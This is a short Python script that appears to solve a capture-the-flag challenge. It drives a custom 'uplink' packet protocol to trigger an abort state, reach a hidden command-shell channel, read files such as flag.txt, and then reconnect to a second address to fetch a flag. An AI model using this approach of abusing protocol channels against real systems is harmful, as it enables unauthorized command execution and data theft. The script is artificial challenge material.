from uplink import Uplink
from uplink.net import convertWordSize
from uplink.packet import Packet
from uplink.errors import UplinkAbort
import socket
import time

def test_protocol(host):
    pass

def main():
    up = Uplink()
    #up.debug = True
    print("[*] Connecting to uplink: ", end="")
    up.connect("0.0.0.0:8001")
    print("Success")

    def get(abort=False, silent=False):
        time.sleep(2)
        try:
            buf = up.recv()
            try:
                buf = buf.decode("utf-8")
            except:
                pass
            if not silent:
                print("Received:", buf)
        except UplinkAbort as a:
            if abort:
                raise a
            print(a)






    def snd(q, c, d):
        if isinstance(d, int):
            p = Packet()
            p.abort = 0
            p.query = q
            p.channel = c
            p.data = d
            #print("Sending", p)
            up.send_packet(p)
            return
        #print("Sending:", (0, q, c, d))
        up.send_data(0, q, c, d)

    """
    print("Trigger the secret channel")
    snd(0, 0o20, 1)
    get()

    # get the table
    print("Getting the secret table")
    snd(1, 0o20, 0)
    get()
    """
    print("Trigger abort")
    snd(0, 0o101, 0)
    get()

    print("Write to command shell")
    snd(0, 0o42, 1)
    print("Get banner")
    get()

    commands = [
        "PWD",
        "CAT flag.txt",
        "CAT channels.txt",
        "CAT current.tle",
        "LS",
    ]
    for command in commands:
        print(command, end=": ")
        snd(0, 0o42, command.encode())
        get()

    up.connect("192.168.177.195:8001")
    print("Get flag")
    snd(1, 0o02, 1)
    get()


main()
